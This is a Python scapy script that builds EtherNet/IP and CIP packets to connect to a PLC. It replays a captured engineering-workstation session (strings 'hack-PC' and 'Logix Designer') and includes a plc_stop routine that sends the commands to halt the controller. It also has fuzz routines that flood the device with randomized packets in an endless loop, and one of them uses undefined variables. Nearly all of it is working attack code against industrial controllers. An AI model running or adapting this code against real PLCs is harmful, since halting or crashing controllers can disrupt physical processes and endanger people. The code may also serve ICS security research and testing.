#! /usr/bin/env python
# coding:utf-8
from scapy.all import conf
from scapy.packet import *
from scapy.fields import *
from scapy.layers.inet import TCP


# ENIP

class RegSessionDataReq(Packet):
    name = "Register Session"
    fields_desc = [LEShortField("Version", 0x0001),
                   XShortField("Flags", 0x0000)]


class Command_Specific_Data_Field_Bak(Packet):
    name = "Command_Specific_Data_Field"
    fields_desc = [XIntField("Interface", 0x00000000),
                   LEShortField("Timeout", 10),
                   LEShortField("ItemCount", 2),
                   LEShortField("Type1", 0x00),
                   LEShortField("data_len1", 0),
                   LEShortField("Type2", 0xb2),
                   LEShortField("data_len2", None)
                   ]

    def post_build(self, p, pay):
        if self.data_len2 is None and pay:
            l = len(pay)
            p = p[:14] + struct.pack("<H", l) + p[16:]
        return p + pay


class CommandSpecificDataItemFieldReq(Packet):
    name = "Command_Specific_Data_Item_Field"
    fields_desc = [
        LEShortEnumField(
            "TypeID", 0x0000, {0x0000: "Null Address Item (0x0000)", 0x00a1: "Connected Address Item (0x00a1)", 0x00b2: "Unconnected Data Item (0x00b2)", 0x00b1: "Connected Data Item (0x00b1)"}),
        # Null Address Item (0x0000)
        ConditionalField(LEShortField("ItemLength0", 0x0), lambda pkt: True if pkt[
                         CommandSpecificDataItemFieldReq].TypeID == 0x0 else False),
        # Connected Address Item (0x00a1)
        ConditionalField(LEShortField("ItemLength1", 0x04), lambda pkt: True if pkt[
                         CommandSpecificDataItemFieldReq].TypeID == 0xa1 else False),
        ConditionalField(LEIntField("ConnectionID", 0xff94403f), lambda pkt: True if pkt[
                         CommandSpecificDataItemFieldReq].TypeID == 0xa1 else False),
        # Connected Data Item (0x00b1)
        ConditionalField(LEShortField("ItemLength", None), lambda pkt: True if pkt[
                         CommandSpecificDataItemFieldReq].TypeID == 0xb1 else False),
        ConditionalField(LEShortField("SeqCount", 0x01), lambda pkt: True if pkt[
                         CommandSpecificDataItemFieldReq].TypeID == 0xb1 else False),
        # Unconnected Data Item (0x00b2)
        ConditionalField(LEShortField("ItemLength", None), lambda pkt: True if pkt[CommandSpecificDataItemFieldReq].TypeID == 0xb2 else False)]

    # def post_build(self, p, pay):
    #     print "p:", str(p).encode('hex')
    #     print "pay:", str(pay).encode('hex')
    #     # print "self:", str(self)
    #     if self.ItemLength is None and pay:
    #         if self.TypeID == 0xb1:
    #             l = len(pay) + 2
    #             p = p[:-4] + struct.pack("<H", l) + p[-2:]
    #         elif self.TypeID == 0xb2:
    #             l = len(pay)
    #             p = p[:-2] + struct.pack("<H", l)
    #     return p + pay


class CommandSpecificDataFieldReq(Packet):
    name = "Command_Specific_Data_Field"
    fields_desc = [XIntField("Interface", 0x00000000),
                   LEShortField("Timeout", 10),
                   FieldLenField(
                       "ItemCount", None, count_of="items", fmt="<H", adjust=lambda pkt, x:x),
                   PacketListField(
                       "items", [], CommandSpecificDataItemFieldReq, count_from=lambda x: x.ItemCount)]

    def post_build(self, p, pay):
        # print "p:", str(p).encode('hex')
        # print "pay:", str(pay).encode('hex')
        # print "items", self.items
        # fix length
        for i in range(len(self.items)):
            if self.items[i].ItemLength is None and pay:
                if self.items[i].TypeID == 0xb1:
                    l = len(pay) + 2
                    p = p[:-4] + struct.pack("<H", l) + p[-2:]
                elif self.items[i].TypeID == 0xb2:
                    l = len(pay)
                    p = p[:-2] + struct.pack("<H", l)
        return p + pay


class ENIPHeader(Packet):
    name = "ENIP_Header"
    fields_desc = [
        LEShortEnumField(
            "Command", 0x0004, {0x0004: "List Services", 0x0064: "List Interfaces", 0x0065: "Register Session", 0x006f: "Send RR Data"}),
        LEShortField("Length", None),
        XIntField("Session", 0x00000000),
        XIntField("Status", 0x00000000),
        StrFixedLenField(
            "SenderContext", '0000000000000000'.decode('hex'), length=8),
        XIntField("Options", 0x00000000)]

    def post_build(self, p, pay):
        if self.Length is None and pay:
            l = len(pay)
            p = p[:2] + struct.pack("<H", l) + p[4:]
        return p + pay

# CIP


class PathDataFieldReq(Packet):
    name = "Path_Data_Field"
    fields_desc = [
        BitEnumField("SegmentType", 0x1, 3, {0x1: "Logical Segment (1)"}),
        BitEnumField(
            "LogicalSegmentType", 0x0, 3, {0x0: "Logical Segment Type: Class ID (0)"}),
        BitEnumField("LogicalSegmentFormat", 0x0, 2, {
                     0x0: "Logical Segment Format: 8-bit Logical Segment (0)"}),
        ConditionalField(StrFixedLenField("Data", "\x01", length=1), lambda pkt: True if (pkt[
                         PathDataFieldReq].LogicalSegmentFormat == 0 and pkt[PathDataFieldReq].SegmentType == 1) else False),
        ConditionalField(StrFixedLenField("Data", "\x01", length=1), lambda pkt: True if (pkt[
                         PathDataFieldReq].LogicalSegmentFormat == 1 and pkt[PathDataFieldReq].SegmentType == 0) else False),
        ConditionalField(StrFixedLenField("Data", "\x01\x01", length=2), lambda pkt: True if (pkt[
                         PathDataFieldReq].LogicalSegmentFormat == 1 and pkt[PathDataFieldReq].SegmentType == 1) else False)
                         ]


class CIPHeader(Packet):
    name = "CIP_Header"
    fields_desc = [
        FlagsField("Type", 0, 1, ["Req", "Rsp"]),
        BitEnumField(
            "sevice", 0x52, 7, {0x52: "Unknow"}),
        FieldLenField(
            "ReqPathSize", None, length_of="PathData", fmt="B", adjust=lambda pkt, x: x / 2),
        PacketListField(
            "PathData", [], PathDataFieldReq, length_from=lambda x: x.ReqPathSize * 2)]


# CIP_CM
#
class CMPathDataFieldReq(Packet):
    name = "CM_Path_Data_Field"
    fields_desc = [
        BitEnumField("SegmentType", 0x1, 3, {0x1: "Logical Segment (1)"}),
        BitEnumField(
            "LogicalSegmentType", 0x0, 3, {0x0: "Logical Segment Type: Class ID (0)"}),
        BitEnumField("LogicalSegmentFormat", 0x0, 2, {
                     0x0: "Logical Segment Format: 8-bit Logical Segment (0)"}),
        ConditionalField(StrFixedLenField("Data", "\x01", length=1), lambda pkt: True if pkt[
                         CMPathDataFieldReq].LogicalSegmentFormat == 0 else False),
        ConditionalField(StrFixedLenField("Data", "\x01\x01", length=2), lambda pkt: True if pkt[
                         CMPathDataFieldReq].LogicalSegmentFormat == 1 else False)
    ]


class CIPCommandSpecificDataReq(Packet):
    name = "CIP_Command_Specific_Data"
    fields_desc = [
        XShortField("ActualTimeOut", 0x07f9),
        LEIntField("OTNetworkID", 0x80000002),
        LEIntField("TONetworkID", 0x80fe0001),
        LEShortField("SerialNumber", 0x0002),
        LEShortField("VendorID", 0x004d),
        LEIntField("OrigSerialNumber", 0x2bd63539),
        LEIntField("ConnTimeOut", 0x00),
        LEIntField("OTPRI", 0x007A1200),
        LEShortField("OTNetworkParm", 0x43f4),
        LEIntField("TOPRI", 0x007A1200),
        LEShortField("TONetworkParm", 0x43f4),
        BitEnumField(
            "Direction", 0x1, 1, {0x1: "Direction: Server (1)"}),
        BitEnumField(
            "Trigger", 0x2, 3, {0x2: "Application Object (2)"}),
        BitEnumField(
            "Class", 0x3, 4, {0x3: "Class (3)"})
    ]


class CIPCMHeader(Packet):
    name = "CIP_CM_Header"
    fields_desc = [
        PacketField(
            "CmdSpecificData", CIPCommandSpecificDataReq(), CIPCommandSpecificDataReq),
        FieldLenField(
            "ReqPathSize", None, length_of="PathData", fmt="B", adjust=lambda pkt, x: x / 2),
        PacketListField(
            "PathData", [], PathDataFieldReq, length_from=lambda x: x.ReqPathSize * 2)]


def create_socket(target_ip, target_port):
    """used to create socket

    Args:
        target_ip: PLC ipaddress
        target_port: PLC port

    return:
        socket
    """
    s = socket.socket()
    s.connect((target_ip, target_port))  # encapsulate into try/catch
    connection = StreamSocket(s, Raw)
    return connection


def create_connect(connection):
    """used to create connect with PLC

    Args:
        connection: socket which connect to PLC

    return:

    """

    response1 = connection.sr1(ENIPHeader())
    response2 = connection.sr1(ENIPHeader(Command=0x0064))
    return ENIPHeader(response1.load), ENIPHeader(response2.load)


def get_session(connection):
    """used to get cip session

    Args:
        connection: socket which connect to PLC

    return:

    """

    response = connection.sr1(ENIPHeader(Command=0x0065) / RegSessionDataReq())
    return ENIPHeader(response.load).Session


def forward_open(connection, session):
    ID1 = int(RandInt())
    ID2 = int(RandInt())
    payload = ENIPHeader(Command=0x006f, Session=session, SenderContext='69000000e0291208'.decode('hex')) / \
              CommandSpecificDataFieldReq() / CIPHeader(sevice=0x54) / \
              CIPCMHeader()
    # fix enip
    payload[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload[CommandSpecificDataFieldReq].Timeout = 0x20
    payload[CommandSpecificDataFieldReq].items[0].TypeID = 0x0
    payload[CommandSpecificDataFieldReq].items[1].TypeID = 0xb2
    # fix CIP
    payload[CIPHeader].PathData = [PathDataFieldReq(), PathDataFieldReq()]
    payload[CIPHeader].PathData[0].SegmentType = 1
    payload[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload[CIPHeader].PathData[0].Data = '\x06'
    payload[CIPHeader].PathData[1].SegmentType = 1
    payload[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload[CIPHeader].PathData[1].Data = '\x01'
    payload[CIPCMHeader].PathData = [PathDataFieldReq(), PathDataFieldReq()]
    payload[CIPCMHeader].PathData[0].SegmentType = 1
    payload[CIPCMHeader].PathData[0].LogicalSegmentType = 0
    payload[CIPCMHeader].PathData[0].LogicalSegmentFormat = 0
    payload[CIPCMHeader].PathData[0].Data = '\x02'
    payload[CIPCMHeader].PathData[1].SegmentType = 1
    payload[CIPCMHeader].PathData[1].LogicalSegmentType = 1
    payload[CIPCMHeader].PathData[1].LogicalSegmentFormat = 0
    payload[CIPCMHeader].PathData[1].Data = '\x01'
    print hex(payload[CIPCMHeader].CmdSpecificData.OTNetworkID)
    print hex(payload[CIPCMHeader].CmdSpecificData.TONetworkID)
    payload[CIPCMHeader].CmdSpecificData.OTNetworkID = ID1
    payload[CIPCMHeader].CmdSpecificData.TONetworkID = ID2
    print hex(payload[CIPCMHeader].CmdSpecificData.OTNetworkID)
    print hex(payload[CIPCMHeader].CmdSpecificData.TONetworkID)
    response = connection.sr1(payload)
    connectid = struct.unpack('<I', str(response)[44:48])[0]
    # payload1
    seq = 1
    payload1 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x5c) / \
               Raw('44000000000000000c006800610063006b002d00500043005c006800610063006b0007004800410043004b002d00500043000c004800410043004b002d00500043005c004800410043004b00'.decode(
            'hex'))
    # fix enip
    payload1[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload1[CommandSpecificDataFieldReq].Timeout = 0x1
    payload1[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload1[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload1[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload1[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload1[CIPHeader].PathData = [PathDataFieldReq() for i in range(2)]
    payload1[CIPHeader].PathData[0].SegmentType = 1
    payload1[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload1[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload1[CIPHeader].PathData[0].Data = '\x8e'
    payload1[CIPHeader].PathData[1].SegmentType = 1
    payload1[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload1[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload1[CIPHeader].PathData[1].Data = '\x01'
    payload1.show()
    payload1.show2()
    response = connection.sr1(payload1)
    # payload2
    seq = seq + 1
    payload2 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x4b) / \
               Raw('a900010001000500020001000300010004000100050001000600010002008080030001000181808000b6dd260c153f1418e75ee1fc87d6dac1a52b153b8062dd2d91c3c61ebc82b9df4079ed4383cdee62b3c854f10a284b3c67c63f584dc7959ed6fd690f7608c7878797ae88d6148ca0515af1de531384b3259e2d566a008ef7fef3b7c5145931e7a7acd0f928b7b7bdf4d6ee0c6796c60a796e2bc7080a920d00c1af3676c74b5f0da0911e5e3730293004aea5fb8b57b3a12246223267c3c0b601e8c3417797f0f1f5bbafa9d6f50395358bbd3ab8afcd8876a02e0cabe11a2c4b79b6b781da8a03d16bf48f99730efdfc5aae546cf92df1c685f0a619c12cf067a11c5cd832106293bf9fc5fee2bf00a5b8cd4d37df1e2a8474dbd09ca31a0ce5d01be19e746d'.decode(
            'hex'))
    # fix enip
    payload2[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload2[CommandSpecificDataFieldReq].Timeout = 0x1
    payload2[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload2[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload2[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload2[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload2[CIPHeader].PathData = [PathDataFieldReq() for i in range(2)]
    payload2[CIPHeader].PathData[0].SegmentType = 1
    payload2[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload2[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload2[CIPHeader].PathData[0].Data = '\x64'
    payload2[CIPHeader].PathData[1].SegmentType = 1
    payload2[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload2[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload2[CIPHeader].PathData[1].Data = '\x01'
    payload2.show()
    payload2.show2()
    response = connection.sr1(payload2)
    # payload3
    seq = seq + 1
    payload3 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x4b)
    # fix enip
    payload3[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload3[CommandSpecificDataFieldReq].Timeout = 0x1
    payload3[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload3[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload3[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload3[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload3[CIPHeader].PathData = [PathDataFieldReq() for i in range(2)]
    payload3[CIPHeader].PathData[0].SegmentType = 1
    payload3[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload3[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload3[CIPHeader].PathData[0].Data = '\x64'
    payload3[CIPHeader].PathData[1].SegmentType = 1
    payload3[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload3[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload3[CIPHeader].PathData[1].Data = '\x01'
    payload3.show()
    payload3.show2()
    response = connection.sr1(payload3)
    time.sleep(0.2)
    while str(response)[48] != '\x00':
        seq = seq + 1
        payload3[CommandSpecificDataFieldReq].items[1].SeqCount = seq
        response = connection.sr1(payload3)
    # payload4
    # seq = seq + 1
    # payload4 = ENIP_Header(Command=0x0070, Session=session) / \
    #     Command_Specific_Data_Field() / CIP_Header(sevice=0x4c)/ Raw('14000a6e380ca7d704216e94a512c90fb68850d254b4'.decode('hex'))
    # # fix enip
    # payload4[Command_Specific_Data_Field].items = [
    #     Command_Specific_Data_Item_Field(), Command_Specific_Data_Item_Field()]
    # payload4[Command_Specific_Data_Field].Timeout = 0x1
    # payload4[Command_Specific_Data_Field].items[0].TypeID = 0xa1
    # payload4[Command_Specific_Data_Field].items[0].ConnectionID = connectid
    # payload4[Command_Specific_Data_Field].items[1].TypeID = 0xb1
    # payload4[Command_Specific_Data_Field].items[1].SeqCount = seq
    # # fix CIP
    # payload4[CIP_Header].PathData = [Path_Data_Field() for i in range(2)]
    # payload4[CIP_Header].PathData[0].SegmentType = 1
    # payload4[CIP_Header].PathData[0].LogicalSegmentType = 0
    # payload4[CIP_Header].PathData[0].LogicalSegmentFormat = 0
    # payload4[CIP_Header].PathData[0].Data = '\x64'
    # payload4[CIP_Header].PathData[1].SegmentType = 1
    # payload4[CIP_Header].PathData[1].LogicalSegmentType = 1
    # payload4[CIP_Header].PathData[1].LogicalSegmentFormat = 0
    # payload4[CIP_Header].PathData[1].Data = '\x01'
    # payload4.show()
    # payload4.show2()
    # response = connection.sr1(payload4)
    # time.sleep(0.2)
    # # payload5
    # seq = seq + 1
    # payload5 = ENIP_Header(Command=0x0070, Session=session) / \
    #     Command_Specific_Data_Field() / CIP_Header(sevice=0x4c)/ Raw('14000a6e380ca7d704216e94a512c90fb68850d254b4'.decode('hex'))
    # # fix enip
    # payload5[Command_Specific_Data_Field].items = [
    #     Command_Specific_Data_Item_Field(), Command_Specific_Data_Item_Field()]
    # payload5[Command_Specific_Data_Field].Timeout = 0x1
    # payload5[Command_Specific_Data_Field].items[0].TypeID = 0xa1
    # payload5[Command_Specific_Data_Field].items[0].ConnectionID = connectid
    # payload5[Command_Specific_Data_Field].items[1].TypeID = 0xb1
    # payload5[Command_Specific_Data_Field].items[1].SeqCount = seq
    # # fix CIP
    # payload5[CIP_Header].PathData = [Path_Data_Field() for i in range(2)]
    # payload5[CIP_Header].PathData[0].SegmentType = 1
    # payload5[CIP_Header].PathData[0].LogicalSegmentType = 0
    # payload5[CIP_Header].PathData[0].LogicalSegmentFormat = 0
    # payload5[CIP_Header].PathData[0].Data = '\x64'
    # payload5[CIP_Header].PathData[1].SegmentType = 1
    # payload5[CIP_Header].PathData[1].LogicalSegmentType = 1
    # payload5[CIP_Header].PathData[1].LogicalSegmentFormat = 0
    # payload5[CIP_Header].PathData[1].Data = '\x01'
    # payload5.show()
    # payload5.show2()
    # response = connection.sr1(payload5)
    # payload6
    seq = seq + 1
    payload6 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x4b) / \
               Raw('010300005000000003000100010000000c006800610063006b002d00500043005c006800610063006b0007004800410043004b002d00500043000e004c006f006700690078002000440065007300690067006e0065007200'.decode(
            'hex'))
    # fix enip
    payload6[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload6[CommandSpecificDataFieldReq].Timeout = 0x1
    payload6[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload6[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload6[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload6[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload6[CIPHeader].PathData = [PathDataFieldReq() for i in range(2)]
    payload6[CIPHeader].PathData[0].SegmentType = 1
    payload6[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload6[CIPHeader].PathData[0].LogicalSegmentFormat = 1
    payload6[CIPHeader].PathData[0].Data = '\x78\x03'
    payload6[CIPHeader].PathData[1].SegmentType = 1
    payload6[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload6[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload6[CIPHeader].PathData[1].Data = '\x01'
    payload6.show()
    payload6.show2()
    response = connection.sr1(payload6)
    # payload7
    seq = seq + 1
    payload7 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x63) / \
               Raw('36000000'.decode('hex'))
    # fix enip
    payload7[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload7[CommandSpecificDataFieldReq].Timeout = 0x1
    payload7[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload7[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload7[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload7[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload7[CIPHeader].PathData = [PathDataFieldReq() for i in range(2)]
    payload7[CIPHeader].PathData[0].SegmentType = 1
    payload7[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload7[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload7[CIPHeader].PathData[0].Data = '\x8e'
    payload7[CIPHeader].PathData[1].SegmentType = 1
    payload7[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload7[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload7[CIPHeader].PathData[1].Data = '\x01'
    payload7.show()
    payload7.show2()
    response = connection.sr1(payload7)
    return connectid, seq


def plc_stop(connection, session, connectid, seq):
    seq = seq + 1
    payload1 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x4b) / Raw('\x00')
    # fix enip
    payload1[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload1[CommandSpecificDataFieldReq].Timeout = 0x1
    payload1[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload1[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload1[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload1[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload1[CIPHeader].PathData = [PathDataFieldReq() for i in range(4)]
    payload1[CIPHeader].PathData[0].SegmentType = 1
    payload1[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload1[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload1[CIPHeader].PathData[0].Data = '\x8e'
    payload1[CIPHeader].PathData[1].SegmentType = 1
    payload1[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload1[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload1[CIPHeader].PathData[1].Data = '\x01'
    payload1[CIPHeader].PathData[2].SegmentType = 1
    payload1[CIPHeader].PathData[2].LogicalSegmentType = 0
    payload1[CIPHeader].PathData[2].LogicalSegmentFormat = 0
    payload1[CIPHeader].PathData[2].Data = '\x74'
    payload1[CIPHeader].PathData[3].SegmentType = 1
    payload1[CIPHeader].PathData[3].LogicalSegmentType = 1
    payload1[CIPHeader].PathData[3].LogicalSegmentFormat = 0
    payload1[CIPHeader].PathData[3].Data = '\x01'
    payload1.show()
    payload1.show2()
    response = connection.sr1(payload1)
    # payload2
    seq = seq + 1
    payload2 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x4f) / \
               Raw('\x01\x00\x01\x00')
    # fix enip
    payload2[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload2[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload2[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload2[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload2[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload2[CIPHeader].PathData = [PathDataFieldReq() for i in range(2)]
    payload2[CIPHeader].PathData[0].SegmentType = 1
    payload2[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload2[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload2[CIPHeader].PathData[0].Data = '\xac'
    payload2[CIPHeader].PathData[1].SegmentType = 1
    payload2[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload2[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload2[CIPHeader].PathData[1].Data = '\x01'
    payload2.show()
    payload2.show2()
    response = connection.sr1(payload2)
    # payload3
    seq = seq + 1
    payload3 = ENIPHeader(Command=0x0070, Session=session) / \
               CommandSpecificDataFieldReq() / CIPHeader(sevice=0x07)
    # fix enip
    payload3[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload3[CommandSpecificDataFieldReq].items[0].TypeID = 0xa1
    payload3[CommandSpecificDataFieldReq].items[0].ConnectionID = connectid
    payload3[CommandSpecificDataFieldReq].items[1].TypeID = 0xb1
    payload3[CommandSpecificDataFieldReq].items[1].SeqCount = seq
    # fix CIP
    payload3[CIPHeader].PathData = [PathDataFieldReq(), PathDataFieldReq()]
    payload3[CIPHeader].PathData[0].SegmentType = 1
    payload3[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload3[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload3[CIPHeader].PathData[0].Data = '\x8e'
    payload3[CIPHeader].PathData[1].SegmentType = 1
    payload3[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload3[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload3[CIPHeader].PathData[1].Data = '\x01'
    response = connection.sr1(payload3)
    return response


def fuzz_enip(connection, session):
    payload = fuzz(ENIPHeader()) / CommandSpecificDataFieldReq()
    payload[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq() for i in range(30)]
    while True:
        connection.send(payload)


def fuzz_cip(connection, session):
    # ID1 = int(RandInt())
    # ID2 = int(RandInt())
    payload = fuzz(ENIPHeader()) / \
              CommandSpecificDataFieldReq() / CIPHeader(sevice=0x54) / \
              CIPCMHeader()
    # fix enip
    payload[CommandSpecificDataFieldReq].items = [
        CommandSpecificDataItemFieldReq(), CommandSpecificDataItemFieldReq()]
    payload[CommandSpecificDataFieldReq].Timeout = 0x20
    payload[CommandSpecificDataFieldReq].items[0].TypeID = 0x0
    payload[CommandSpecificDataFieldReq].items[1].TypeID = 0xb2
    # fix CIP
    payload[CIPHeader].PathData = [PathDataFieldReq(), PathDataFieldReq()]
    payload[CIPHeader].PathData[0].SegmentType = 1
    payload[CIPHeader].PathData[0].LogicalSegmentType = 0
    payload[CIPHeader].PathData[0].LogicalSegmentFormat = 0
    payload[CIPHeader].PathData[0].Data = '\x06'
    payload[CIPHeader].PathData[1].SegmentType = 1
    payload[CIPHeader].PathData[1].LogicalSegmentType = 1
    payload[CIPHeader].PathData[1].LogicalSegmentFormat = 0
    payload[CIPHeader].PathData[1].Data = '\x01'
    payload[CIPCMHeader].PathData = [PathDataFieldReq(), PathDataFieldReq()]
    payload[CIPCMHeader].PathData[0].SegmentType = 1
    payload[CIPCMHeader].PathData[0].LogicalSegmentType = 0
    payload[CIPCMHeader].PathData[0].LogicalSegmentFormat = 0
    payload[CIPCMHeader].PathData[0].Data = '\x02'
    payload[CIPCMHeader].PathData[1].SegmentType = 1
    payload[CIPCMHeader].PathData[1].LogicalSegmentType = 1
    payload[CIPCMHeader].PathData[1].LogicalSegmentFormat = 0
    payload[CIPCMHeader].PathData[1].Data = '\x01'
    payload[CIPCMHeader].CmdSpecificData.OTNetworkID = ID1
    payload[CIPCMHeader].CmdSpecificData.TONetworkID = ID2
    response = connection.send(payload)
